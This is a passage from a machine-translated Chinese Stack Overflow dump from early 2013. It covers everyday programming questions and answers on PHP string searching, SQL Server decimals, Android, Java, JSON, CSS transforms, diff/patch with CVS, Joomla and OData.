} 
```

请注意，由于 -`or`运算符，如果第一个检查已经显示`$a`包含“are”，则不会执行第二次检查（对于“be”）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-01T14:38:48.833

### 另一种选择：在较长的字符串中搜索任意长度的单词。

由于您还没有从所有 strpos 答案中选择一个答案（其中大多数应该只使用两个单词，请尝试我的这个超过字数限制的函数。它可以从较长的字符串中找到任何不同长度的单词（但是不使用 strpos）。我认为使用 strpos，您必须知道单词的数量才能确定应该使用多少 || 或使用循环（有点）。这种方法消除了所有这些，并为您提供了更灵活的重用代码的方式。我认为代码应该是灵活的、可重用的和动态的。测试它，看看它是否符合你的要求！

```
function findwords($words, $search) {
    $words_array = explode(" ", trim($words));
    //$word_length = count($words_array);

    $search_array = explode(" ", $search);
    $search_length = count($search_array);

    $mix_array = array_intersect($words_array, $search_array);
    $mix_length = count($mix_array);

    if ($mix_length == $search_length) {
        return true;
    } else {
        return false;
    }
}

 //Usage and Examples

    $words = "This is a long string";
    $search = "is a";

    findwords($words, $search);

    // $search = "is a"; // returns true
    // $search = "is long at"; // returns false
    // $search = "long"; // returns true
    // $search = "longer"; // returns false
    // $search = "is long a"; // returns true
    // $search = "this string"; // returns false - case sensitive
    // $search = "This string"; // returns true - case sensitive
    // $search = "This is a long string"; // returns true 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-01T14:08:29.617

```
$a = 'how are be';
if (strpos($a,'are') !== false || strpos($a,'be') !== false) {
   echo 'contains';
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T14:06:07.540

尝试：

```
if (strpos($a,'are') !== false || strpos($a,'be') !== false)
    echo 'what you want'; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-01T14:06:15.913

```
if ((strpos($a,'are') !== false) || (strpos($a, 'be') !==false) {
    echo 'contains';
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-01T14:06:20.137

这是你想要的吗？

```
if ((strpos($a,'are') !== false) || (strpos($a,'be') !== false)) {
    echo 'contains';
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-03-01T14:07:11.390

```
if (strpos($a,'are') !== false || strpost($a, 'be') !== false) {
    echo "contains";
} 
```

**Brain Candy：如果第一个返回 true，它将跳过第二个检查。所以两者都可能是真的。如果第一个是假的，那么它只会检查第二个。这称为短路。**

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-03-01T14:08:16.700

```
if(strstr($a,'are') || strstr($a,'be')) echo 'contains'; 
```

哼，像这样？

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-03-01T14:10:24.817

```
if (strpos($a,'are') || strpos($a, 'be') {
echo 'contains';
} 
```

# sql-server - 如果小数部分为 0，则 SQL Server 舍入小数数据

> ID：15159591
> 
> 赞同：0
> 
> 时间：2013-03-01T14:04:34.420
> 
> 标签：sql-server, decimal

在 SQL Server 存储过程中，我将变量转换为十进制：

```
CAST( @ToValue as decimal(38,5) ) 
```

如果结果是 57282.0000 （十进制值为 0 ），我希望它显示为 57282。

否则，例如，我想显示为 57282.48300。

我不能使用浮点数，因为如果该值大于 8 位数字，它会显示为指数格式。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:24:35.923

您应该在报告软件的格式选项中执行此操作。

如果由于某种原因这是不可能的，那么以下可能会起作用。

```
;WITH T(Val) AS
(
SELECT 57282 UNION ALL
SELECT 57282.48300
)
SELECT CASE WHEN 1= 0 THEN NULL  
            WHEN Val = FLOOR(Val) THEN CAST(CAST(Val AS INT)AS SQL_VARIANT) 
            ELSE CAST(Val AS DECIMAL(38,5))
            END
FROM T 
```

# android - 带捕捉的水平滚动视图

> ID：15159593
> 
> 赞同：0
> 
> 时间：2013-03-01T14:04:39.087
> 
> 标签：android, android-layout

我从 Android 开发开始，我正在尝试做一个滚动视图。我只是使用了一个水平滚动视图，但是这个布局没有对齐。

经过一番搜索，我找到了这个[https://github.com/ysamlan/horizo​​ntalpager](https://github.com/ysamlan/horizontalpager)。操作与iPhone类似，但使用起来有些麻烦。

如何使用捕捉进行水平滚动视图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:23:29.267

ViewPager 不是您要找的吗？

# asp.net - 如何在url中隐藏查询字符串值

> ID：15159594
> 
> 赞同：1
> 
> 时间：2013-03-01T14:04:39.077
> 
> 标签：asp.net, url, query-string

从 GridView 的 RowCommand 事件请求页面，这里是代码

```
 protected void grdClaimList_RowCommand(object sender, GridViewCommandEventArgs e)
{
    switch (e.CommandName)
    {
        case "ViewClaim":
            Response.Redirect("ClaimStatus.aspx?id=" + e.CommandArgument);
            break;
    }         
} 
```

我想从 url 隐藏查询字符串，可以吗？如果是，请告诉我怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:07:22.357

我认为这是不可能的，但如果您不希望用户看到它并输入不同的值，您可以加密然后在另一端解密它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T14:15:18.773

您也可以使用会话变量或查看状态。

# java - 如何在java中的其他地方使用计数

> ID：15159599
> 
> 赞同：0
> 
> 时间：2013-03-01T14:05:02.737
> 
> 标签：java

无论如何，我可以将计数放入变量中。例如，我有 Count 来计算行数。之后，我想使用计数提供的数字，然后将此数字添加到可在其他地方使用的变量中，例如与另一个数字相加，或查找百分比或使用该数字创建饼图。

```
public void TotalCount12() throws FileNotFoundException  {
        Scanner file = new Scanner(new File("read.txt"));
        int count = 0;
        while(file.hasNext()){
            count++;
            file.nextLine();
            }
        System.out.println(count);
        file.close(); 
```

我想使用我将要计数的数字，并在其他地方使用它（例如另一种方法），但我不知道该怎么做。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:18:35.553

首先，如果您是编程新手，我建议您应该完成这个[javatutorial](http://docs.oracle.com/javase/tutorial/getStarted/index.html)。

如果在类中将其定义为方法外的**全局变量**（作为类的属性），则可以在类中的每个方法中使用它。

但是如果你想在不同类的项目的任何地方使用它，你可以使用[单例设计模式](http://en.wikipedia.org/wiki/Singleton_pattern)；

```
public class ClassicSingleton { 
    private static ClassicSingleton instance = null; 
    protected ClassicSingleton() {
     // Exists only to defeat instantiation. 
    } 
    public static ClassicSingleton getInstance() {
        if(instance == null) 
        {
            instance = new ClassicSingleton(); 
        } 
        return instance; 
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:09:20.357

**编辑**`count`为变量 创建一个getter方法。

例如

```
public class Test {
  private int count = 0;

  public void method1(){
    while(file.hasNext()){
        count++;
        file.nextLine();
        }
    System.out.println(count);
  }

  public void method2(){
    System.out.println(count);
  }

  public int getCount(){
    return count;
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T15:25:02.887

只需返回您创建的方法中的值：

```
public class Test {

  public int TotalCount12() throws FileNotFoundException  {
    Scanner file = new Scanner(new File("read.txt"));
    int count = 0;
    while(file.hasNext()) {
      count++;
      file.nextLine();
    }
    System.out.println(count);
    file.close();
    return count;
  }

  public static void main(String[] args) {
    Test t = new Test();
    int testCount = TotalCount12();
  }

} 
```

# javascript - 许多可在屏幕上自由拖动的图像

> ID：15159605
> 
> 赞同：0
> 
> 时间：2013-03-01T14:05:23.420
> 
> 标签：javascript, html, drag-and-drop, draggable

我正在尝试构建一个页面，以便我和我的团队可以在屏幕上自由放置一些图像。问题是我无法找到使这些图像可拖动的方法。我试图自己弄清楚并想到了一个关于它的好话题：[HTML5 拖放以将 div 移动到屏幕上的任何位置？](https://stackoverflow.com/questions/7278409/html5-drag-and-drop-to-move-a-div-anywhere-on-the-screen)

我试图将这个想法应用到我的页面上，并用“getElementsByClassName”替换“getElementsByID”，但没有骰子。

此外，如果可拖动图像尊重页面的响应性，如果有人知道如何做到这一点，那将是两倍好。

这是我尝试的代码笔：http: [//codepen.io/GuiHarrison/pen/EsHyr](http://codepen.io/GuiHarrison/pen/EsHyr)

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:25:16.490

好吧，我只是编造了这个，它有点马车，但你可以玩弄它。

```
<html>
<head>
    <style>
        #mydiv{
        width: 100px;
        height: 100px;
        border: solid black 1px;
        position: absolute;
        }
    </style> 
</head>
<body>
    <div id="mydiv" onmousedown="ismousedown(1)" onmouseup="ismousedown(0)" onmousemove="mousemove(event)"></div>
    <script>
        var mousedown = false;
        function ismousedown(tf){
            if(tf == 1){
            mousedown = true;
            }
            else{
                mousedown = false;
            }
        }
        function mousemove(event){
            if(mousedown){
                document.getElementById("mydiv").style.left=event.pageX;
                document.getElementById("mydiv").style.top=event.pageY;
            }
        }
    </script>
</body> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:49:10.070

您可以为此使用 kineticjs。检查这个！

[http://www.html5canvastutorials.com/labs/html5-canvas-drag-and-drop-resize-and-invert-images/](http://www.html5canvastutorials.com/labs/html5-canvas-drag-and-drop-resize-and-invert-images/)

这个比较相关，

[http://html5example.net/entry/html5-canvas/html5-canvas-drag-and-drop-multiple-images-with-kineticjs](http://html5example.net/entry/html5-canvas/html5-canvas-drag-and-drop-multiple-images-with-kineticjs)

# java - 更新 JSONObject 中的元素

> ID：15159610
> 
> 赞同：72
> 
> 时间：2013-03-01T14:05:41.673
> 
> 标签：java, android, json

假设我给了一个 JSONObject

```
{
 "person":{"name":"Sam", "surname":"ngonma"},
 "car":{"make":"toyota", "model":"yaris"}
 } 
```

如何更新 JSONObject 中的一些值？

如下所示：

```
String name = jsonArray.getJSONObject(0).getJSONObject("person").getString("name");
name = "Sammie"; 
```

* * *

## 回答 #1

> 赞同：126
> 
> 时间：2013-03-01T14:08:04.307

使用 put 方法：[https ://developer.android.com/reference/org/json/JSONObject.html](https://developer.android.com/reference/org/json/JSONObject.html)

```
JSONObject person =  jsonArray.getJSONObject(0).getJSONObject("person");
person.put("name", "Sammie"); 
```

* * *

## 回答 #2

> 赞同：37
> 
> 时间：2013-03-01T14:51:16.010

删除键，然后再次添加修改后的键、值对，如下所示：

```
 JSONObject js = new JSONObject();
    js.put("name", "rai");

    js.remove("name");
    js.put("name", "abc"); 
```

我没有用你的例子；但在概念上是一样的。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-09-30T18:31:09.267

你好，我可以建议你通用的方法。使用递归。

```
 public static JSONObject function(JSONObject obj, String keyMain,String valueMain, String newValue) throws Exception {
    // We need to know keys of Jsonobject
    JSONObject json = new JSONObject()
    Iterator iterator = obj.keys();
    String key = null;
    while (iterator.hasNext()) {
        key = (String) iterator.next();
        // if object is just string we change value in key
        if ((obj.optJSONArray(key)==null) && (obj.optJSONObject(key)==null)) {
            if ((key.equals(keyMain)) && (obj.get(key).toString().equals(valueMain))) {
                // put new value
                obj.put(key, newValue);
                return obj;
            }
        }

        // if it's jsonobject
        if (obj.optJSONObject(key) != null) {
            function(obj.getJSONObject(key), keyMain, valueMain, newValue);
        }

        // if it's jsonarray
        if (obj.optJSONArray(key) != null) {
            JSONArray jArray = obj.getJSONArray(key);
            for (int i=0;i<jArray.length();i++) {
                    function(jArray.getJSONObject(i), keyMain, valueMain, newValue);
            }
        }
    }
    return obj;
} 
```

它应该工作。如果您有任何问题，请继续。我准备好了。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-06-04T05:15:07.453

用新值更新任何 JSONObjet 的通用方法。

```
private static void updateJsonValues(JsonObject jsonObj) {
    for (Map.Entry<String, JsonElement> entry : jsonObj.entrySet()) {
        JsonElement element = entry.getValue();
        if (element.isJsonArray()) {
            parseJsonArray(element.getAsJsonArray());
        } else if (element.isJsonObject()) {
            updateJsonValues(element.getAsJsonObject());
        } else if (element.isJsonPrimitive()) {
            jsonObj.addProperty(entry.getKey(), "<provide new value>");
        }

    }
}

private static void parseJsonArray(JsonArray asJsonArray) {
    for (int index = 0; index < asJsonArray.size(); index++) {
        JsonElement element = asJsonArray.get(index);
        if (element.isJsonArray()) {
            parseJsonArray(element.getAsJsonArray());
        } else if (element.isJsonObject()) {
            updateJsonValues(element.getAsJsonObject());
        }

    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-04-23T12:46:31.280

```
public static JSONObject updateJson(JSONObject obj, String keyString, String newValue) throws Exception {
            JSONObject json = new JSONObject();
            // get the keys of json object
            Iterator iterator = obj.keys();
            String key = null;
            while (iterator.hasNext()) {
                key = (String) iterator.next();
                // if the key is a string, then update the value
                if ((obj.optJSONArray(key) == null) && (obj.optJSONObject(key) == null)) {
                    if ((key.equals(keyString))) {
                        // put new value
                        obj.put(key, newValue);
                        return obj;
                    }
                }

                // if it's jsonobject
                if (obj.optJSONObject(key) != null) {
                    updateJson(obj.getJSONObject(key), keyString, newValue);
                }

                // if it's jsonarray
                if (obj.optJSONArray(key) != null) {
                    JSONArray jArray = obj.getJSONArray(key);
                    for (int i = 0; i < jArray.length(); i++) {
                        updateJson(jArray.getJSONObject(i), keyString, newValue);
                    }
                }
            }
            return obj;
        } 
```

# windows-7 - 在 Windows 中使用 diff/patch，又名“在输入第 4 行找不到要修补的文件”

> ID：15159625
> 
> 赞同：5
> 
> 时间：2013-03-01T14:06:26.297
> 
> 标签：windows-7, diff, cvs, patch

我正在使用 CVS 和 win7。我需要将一些更改从主干复制到分支，所以我想我可以使用“diff -ruN”将更改放入文件中，然后使用“patch -i”将它们应用到分支。

所以我看到了[这个页面](http://jungels.net/articles/diff-patch-ten-minutes.html)，还有[这个页面](http://drupal.org/node/60179)。我已经有 cygwin diff，所以我在[这里](http://gnuwin32.sourceforge.net/packages/patch.htm)得到了 gnu 补丁。我做了两个文件

```
\test\mydir1\afile.txt
\test\mydir2\afile.txt 
```

有细微的差别。然后我输入

```
cd test
diff -ruN mydir1 mydir2 >test.patch
patch --dry-run -i test.patch 
```

结果是

```
can't find file to patch at input line 4
Perhaps you should have used the -p or --strip option? 
```

所以我尝试了

```
patch --dry-run --verbose -p1 -i test.patch 
```

我得到同样的错误。我尝试了很多其他的东西很长一段时间都没有成功。为什么这么难？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-01T14:06:26.297

好的，这是我需要知道的两件事，但没有在任何地方记录

*   diff输出使用unix格式，但是patch需要dos格式
*   补丁中的默认“条带”不是您可能期望的 -p0 。它是-p1。

这有效...

```
diff -ruN mydir1 mydir2 | unix2dos > test.patch
patch -p0 -i test.patch 
```

您必须转换为 DOS 行尾，并且必须指定 -p0。否则，默认值为 -p1。我希望这对其他人有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-18T14:42:15.653

从那以后我对 CVS 有了更多的了解，所以我不再使用补丁了。如果要将特定更改从一个 CVS 分支复制到另一个，可以使用[CVS UPDATE -j -j](http://cvsgui.sourceforge.net/howto/cvsdoc/cvs_5.html)来完成。例如，假设您将 HEAD 上的 file1.cpp 从 1.45 更改为 1.46。您可以导航到分支并键入

```
cvs update -kk -j 1.45 -j 1.46 file1.cpp 
```

它会将指定的更改从 HEAD 复制到分支。

如果要从许多文件中复制更改，可以使用 cvs rtag 根据日期（等）创建标签，然后在更新中使用标签，例如

```
cvs update -kk -j tagBeforeChange -j tagAfterChange 
```

# php - joomla：将 select.optgroup 添加到 select.genericlist

> ID：15159627
> 
> 赞同：1
> 
> 时间：2013-03-01T14:06:31.110
> 
> 标签：php, joomla, optgroup

我需要在我的 select.genericlist 中添加一个 select.optgroup，这是我的代码：

```
foreach ($this->methods as $method) {
      if ($this->checkConditions($cart, $method, $cart->pricesUnformatted)) {
          $methodSalesPrice = $this->calculateSalesPrice($cart, $method, $cart->pricesUnformatted);
          $method->$method_name = $this->renderPluginName($method);

              $session = JFactory::getSession();
              $htmlI[] = $this->getPluginHtml($method, $selected, $methodSalesPrice);
              // this is my attempt
              $htmlI[] = JHTML::_('Select.optgroup', 'My optgroup');
              // my attempt ends here
              $htmlI[] = JHTML::_('Select.genericlist', $this->banks, 'service_issuer', 'size=1', 'key', 'value', $session->get('service_issuer', 0, 'vm'));
              $html[] = $htmlI;

      }
  } 
```

这将返回以下内容：

```
array 
```

有没有人这样做过？非常感谢您的建议

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-04T11:56:02.920

我已经设法自己修复它，下面是工作代码

```
if($method->payment_method == "mymethod") {
              $session = JFactory::getSession();
              $htmlI = $this->getPluginHtml($method, $selected, $methodSalesPrice);
              $banksEra[] = JHTML::_('select.option', '', JText::_('VMPAYMENT_BANKS'));
              $banksEra[] = JHTML::_('select.optgroup', 'Countries');
              foreach ($this->banksEra as $key => $value) {
                $banksEra[] = JHTML::_( 'select.option', $key, $value );
              }
              $htmlI .= JHTML::_('select.genericlist', $banksEra, 'issuer', 'class="inputbox"', 'value', 'text', $session->get('issuer', 0, 'vm'));
              $html[] = $htmlI;
          } 
```

# android - 开始新活动时 ActivityRecord 的 Activity 暂停超时延迟

> ID：15159630
> 
> 赞同：3
> 
> 时间：2013-03-01T14:06:46.517
> 
> 标签：android, android-intent, android-activity

每当我在我的应用程序中开始一项新活动（即使是一个普通的、空的活动）时，我都会看到一个相对较大的延迟（1 到 2 秒）。检查 LogCat 我看到了这个：

```
// This is a transition from CurrentActivity to NewActivity
03-01 14:59:00.195: I/ActivityManager(515): START {act=android.intent.action.GET_CONTENT ...} from pid 9382
03-01 14:59:00.242: D/NewActivity(9382): Intent started
03-01 14:59:00.242: D/CurrentActivity(9382): Activity.onPause
03-01 14:59:00.359: D/dalvikvm(515): GC_CONCURRENT freed 824K, 20% free 10419K/12871K, paused 2ms+12ms
03-01 14:59:00.476: I/cat(416): <4>[22335.131317] CPU1: Booted secondary processor
03-01 14:59:00.476: I/cat(416): <6>[22335.138885] Switched to NOHz mode on CPU #1
03-01 14:59:00.742: W/ActivityManager(515): Activity pause timeout for ActivityRecord{4131c158 CURRENT-ACTIVITY}
03-01 14:59:01.179: D/dalvikvm(9382): GC_CONCURRENT freed 1562K, 68% free 10961K/33415K, paused 2ms+6ms
03-01 14:59:01.937: D/NewActivity(9382): NewActivity.onCreate 
```

请注意，一切正常，没有崩溃，只是这个奇怪的延迟。如果我将活动中的代码放在 a 中`DialogFragment`并显示对话框，它几乎是即时的。只有当代码在单独的 Activity 中运行时才会出现这种延迟。里面运行的代码`CurrentActivity.onPause`是最小的，不负责延迟。

补充：以上是在 android 下运行时`API14`。不同设备上的 Android 2.2 (API) 显示相同的延迟，但略有不同`LogCat`：

```
I/ActivityManager(2473): Starting activity: Intent { act=android.intent.action.GET_CONTENT cmp=NewActivity }
03-01 15:08:06.537: D/Editor(4591): Activity.onSaveInstanceState
03-01 15:08:06.537: D/Editor(4591): Activity.onPause
03-01 15:08:06.595: V/InputDevice(2473): ID[0]=0(0) Up(1=>0)
03-01 15:08:07.033: W/ActivityManager(2473): Activity pause timeout for HistoryRecord{CurrentActivity}
03-01 15:08:07.873: D/dalvikvm(4591): GC_FOR_MALLOC freed 5867 objects / 421464 bytes in 33ms
03-01 15:08:08.720: D/NewActivity(4591): NewActivity.onCreate 
```

这就是我创建和启动 NewActivity 的方式： Intent intent = new Intent(this, ImagePickerActivity.class); 意图.setAction（意图.ACTION_GET_CONTENT）；startActivityForResult（意图，ACTIVITY_RESULT_ADD_IMAGE）；

CurrentActivity 太大而无法发布。

知道是什么原因造成的以及如何预防吗？

提前致谢，

# java - 从Java中的CSV文件中提取值

> ID：15159631
> 
> 赞同：0
> 
> 时间：2013-03-01T14:06:48.187
> 
> 标签：java, android, csv

我在从我正在开发的 android 应用程序的 CSV 文件中提取值时遇到了一些问题。CSV 文件采用以下格式：

```
Acton Town (District),Acton Town (Piccadilly),2.00
Aldgate (Circle),Aldgate (Metropolitan),4.00
Aldgate East (District),Aldgate East (Hammersmith And City),2.00 
```

我正在尝试使用以下方法将其导入我的 java 类：

```
public ArrayList<Connection> importConnections(){
        try 
        {
            //gets the lines.txt file from assets
            in = this.getAssets().open("connections.csv");
            Scanner scan = new Scanner(in);
            TextView lineData = (TextView)findViewById(R.id.displayLine);
            String connection = null;
            String startingStation = null;
            String endingStation = null;
            Float duration = 0;
            do
            {
                connection = scan.nextLine();
                String delimiter = ",\n";
                StringTokenizer tokens = new StringTokenizer(connection, delimiter);
                startingStation = tokens.nextToken();
                endingStation = tokens.nextToken();
                duration = Float.parseFloat(tokens.nextToken());
                connections.add(startStation, endStation, duration);
            }
            while(scan.hasNext());
            //for testing purposes
            lineData.setText(endingStation);
        } 
        catch (IOException e) 
        {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return connections;
    } 
```

如果我运行它，应用程序将崩溃，我不知道为什么。如果我设置`lineData.setText(endingStation)`为`lineData.setText(connection)`，它将显示整行，例如：

```
Acton Town (District),Acton Town (Piccadilly),2.00 
```

如果我注释掉

> 持续时间 = Float.parseFloat(tokens.nextToken());

它将运行该方法。任何人都可以找到这种方法的任何错误吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T15:19:06.653

您可以尝试使用 OpenCSV [http://opencsv.sourceforge.net/](http://opencsv.sourceforge.net/)

它使用起来非常简单，并返回每行的数组。

```
CSVReader reader = new CSVReader(new FileReader(<filepath>));

String[] temp;
int NUM = #; //number of rows in csv, or insert code to read through file until null.

for(int i = 0; i < NUM; i++)
{               
    temp = reader.readNext();               //read next line into temp
}

System.out.println(temp[0]); //Acton Town (District)
System.out.println(temp[1]); //Acton Town (Piccadilly)
System.out.println(temp[2]); //2.00 (string)

reader.close(); 
```

就像我说的那样，它很容易使用，并且可以防止您不得不自己解析字符串。

# operating-system - 桶鱼状态复制的解释

> ID：15159643
> 
> 赞同：1
> 
> 时间：2013-03-01T14:07:27.987
> 
> 标签：operating-system, kernel, replication, multicore

您能否说出 Barrelfish 操作系统如何在每个内核上实现其内核的状态复制，或者在内核上实现紧密耦合的“共享”，以防 e 具有多核或多核芯片。当我试图理解这一点时，即使我尝试检查源代码，也没有更多文档解释在整个内核上生成内核的过程。

如果您能提供一种方法来理解这部分的源代码，那将是非常棒的，因为我真的试图追踪源代码，但看起来我是一个人在大海中游泳。

非常感谢。阿卜杜~

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:42:40.963

Barrelfish 中状态复制的一个示例是能力系统 [1，尤其是第 5 节]。每个核心（实际上，每个调度程序）都有自己的功能存储。许多操作可以在本地完成，无需与其他内核同步。如果需要同步，能力系统会帮助我们找到所有副本，因为到其他核心的复制操作是显式的并且可以被跟踪。

Barrelfish 源代码可能不是进一步研究的地方，因为我们的能力系统非常复杂。

如果您还有其他问题，请参阅 Deepthought 建议的邮件列表 [2]

[1] [http://www.barrelfish.org/TN-013-CapabilityManagement.pdf](http://www.barrelfish.org/TN-013-CapabilityManagement.pdf)
[2] [http://lists.inf.ethz.ch/mailman/listinfo/barrelfish-users](http://lists.inf.ethz.ch/mailman/listinfo/barrelfish-users)

# javascript - 更改 transformz 属性

> ID：15159644
> 
> 赞同：4
> 
> 时间：2013-03-01T14:07:34.047
> 
> 标签：javascript, jquery, css

我需要使用 jquery 更改元素的 transformz。我有一个带有css的div：

```
.bottom_face {
  -webkit-transform: rotateX(-90deg) rotate(180deg) translateZ(487px);
  -moz-transform: rotateX(-90deg) rotate(180deg) translateZ(347px);
 } 
```

当用户更改表单上的属性时，我想更改 translateZ 值以添加他们输入的数量：

```
$('.bottom_face ').css('-webkit-transform') ?? 
```

*如何在不覆盖 rotateX 和 rotate 属性*的情况下访问上述 translateZ属性？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T08:52:46.867

这是我试图精简到最低限度的一些代码：

```
$("#add").click(function() {
    var z = $("#z").val();
    $(".bottom-face").each(function() {
        var $c = $(this);
        var css;
        if (css = $c.css("-webkit-transform")) {    // assignment
            $c.css("-webkit-transform",
               $c.css("-webkit-transform") + " translateZ(" + z + "px)"
            );
            //console.log( $c.css("-webkit-transform") );
        }
    });
}); 
```

[**以及jsfiddle**](http://jsfiddle.net/martyk/afwRt/6/)的链接[](http://jsfiddle.net/martyk/afwRt/6/)

 *** * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T23:18:59.420

操作，

首先，[我设置了一个](http://plnkr.co/edit/aLyMV2?p=preview)可以实现您所要求的 Plunk。我是这样做的：

## JS

```
$('document').ready(function () {
    $('#amount_to_rotate').keydown(function () {
        var el = $(".bottom_face"),
            amt = parseInt($(this).val());
        rotZ = {
            '-webkit-transform': 'rotateX(-9deg) rotate(-10deg) translateZ(' + amt + 'px)',
            '-moz-transform'   : 'rotateX(-9deg) rotate(-10deg) translateZ(' + amt + 'px)',
        }
        el.css(rotZ);
    }).keyup(function () {
        if ($(this).val().length == 0) {
            // Return to state given by CSS class
            $(".bottom_face").attr('style', ' ');
        }
    });
}); 
```

## 细节

有`input`一个`keydown`和`keyup`事件监听器。当用户输入一个值时，它被添加到一个对象中，然后`style`通过 jQuery 的`css`函数推送到元素的属性中。以这种方式使用对象允许我们设置静态值并为该值传递一个变量（在这种情况下`amt`）`translateZ`。

为了安全起见，由于我们正在处理用户输入，我们`val()`通过仅提取数字来过滤输入：`parseInt($(this).val());`

另外值得注意的是，我必须修改您最初为变换指定的值，`rotateX(-90deg)`因为它会在其 x 轴上翻转元素，使其变得不可见。如果这是您想要的结果，您显然可以将其更改回您认为合适的任何结果。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-08T17:17:10.993

为什么不直接附加更改后的 translateZ？

```
.bottom_face {
    transform: translateZ(487px);
} 
```

结果与

```
.bottom_face {
    transform: translateZ(487px) translateZ(-50px) translateZ(50px);
} 
```

**编辑**：[我的意思的例子。](http://jsfiddle.net/GxbNV/1/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-08T21:47:01.920

当你使用`.css(-webkit-transform)`它时，它会返回一个[`matrix3d`](https://developer.apple.com/library/safari/#documentation/appleapplications/reference/SafariCSSRef/Articles/Functions.html)值，这使得找到原始值变得非常困难。

示例`matrix3d`：

```
matrix3d(-1, 0.00000000000000012095693648649962, -0.000000000000000019157696688784726, 0, -0.00000000000000012246467991473532, -0.9876883405951378, 0.15643446504023087, 0, 0, 0.15643446504023087, 0.9876883405951378, 0, 0, 76.18358447459244, 481.0042218698321, 1) 
```

您可以找到`rotate`值：[source](http://css-tricks.com/get-value-of-css-rotation-through-javascript/)或[demo](http://jsfiddle.net/chriscoyier/459jS/112/)；不幸的是，这不包括`rotateX`or `rotateY`。

解决此问题的最简单方法是执行以下操作：

```
var _translate = '30px';
$('.bottom_face').css('-webkit-transform', 'rotateX(-90deg) rotate(180deg) translateZ(' + _translate + ')'); 
```

演示：http: [//jsfiddle.net/SLGdE/21/](http://jsfiddle.net/SLGdE/21/)

希望这可以帮助！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-11-13T15:22:56.403

这是一个javascript解决方案：

**1\. 将对象的转换属性转换为字符串**

```
var currentTransformation = String(myobject.style.transform); 
```

**2.替换你想要转换的值**

```
var finalTransformation = currentTransformation.replace("translateZ(100px)", "translateZ(YOURVALUEpx)"); 
```

**3.分配新的转换**

```
myobject.style.transform = finalTransformation; 
```

完毕！**

# c# - 如何从 OData 服务中检索图像？

> ID：15159649
> 
> 赞同：0
> 
> 时间：2013-03-01T14:07:57.577
> 
> 标签：c#, odata

我有一个 OData 服务（它的 System Center Orchestrator 的 Web 服务，如果你必须知道的话），如果我查询它会返回一个 BMP 图像

**[http://localhost.com/Orchestrator2012/Orchestrator.svc/RunbookDiagrams(guid](http://localhost.com/Orchestrator2012/Orchestrator.svc/RunbookDiagrams(guid) '882f767d-63bd-437c-b0c7-4051aac56176')/$value**

所以它基本上是说，给我 ID 为 882f767d-63bd-437c-b0c7-4051aac56176 的 RunbookDiagram

它在 IE 中正确呈现它。但是当我从 C# 中查询它时，我无法获取图像数据，但我确实得到了所有其他数据字段。

现在网络服务的文档说我需要使用 $value 来返回查询。但是如何在 C# 的以下 OData 查询中使用 $value

```
RunbookDiagram rbkdiag=orch.RunbookDiagrams.Where(
                                                  m => m.RunbookId ==runbookId
                                                 ).SingleOrDefault(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T15:05:53.063

也许该服务将图像作为媒体链接条目返回？您可以通过查看从服务器返回的 xml 并查找 m:HasStream="true" 来检查这一点

如果是这种情况，请在上下文中使用[GetReadStream](http://msdn.microsoft.com/en-us/library/system.data.services.client.dataservicecontext.getreadstream)。

查看[这个](http://blogs.msdn.com/b/astoriateam/archive/2010/09/08/data-services-streaming-provider-series-part-2-accessing-a-media-resource-stream-from-the-client.aspx)astoriatam 博客文章了解详细信息。

# android - 在android apk应用程序中添加语言资源

> ID：15159651
> 
> 赞同：0
> 
> 时间：2013-03-01T14:08:01.750
> 
> 标签：android, android-resources

好吧，我有一个单一语言的 android 应用程序，我翻译了**res/values/strings.xml**中的字符串以使其成为多语言应用程序。例如，我制作了**values-fr/strings.xml**，**values-es/strings.xml** ... 在编译我的应用程序时，我收到此错误 mayapp/res/values-fr/strings.xml:1: error: Error parsing XML ：XML 声明格式不正确 mayapp/res/values-es/strings.xml:1：错误：解析 XML 时出错：XML 声明格式不正确

如何解决这个问题呢。我需要你的帮助，因为我是 android 开发的新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:36:39.923

对特殊字符使用数字代码： `<string name="app_name">R&#233;pondeur</string>`

# java - 在 Java 中实现异构函数映射的方法有哪些？它们的优缺点是什么？

> ID：15159652
> 
> 赞同：1
> 
> 时间：2013-03-01T14:08:02.310
> 
> 标签：java, methods, map, functor

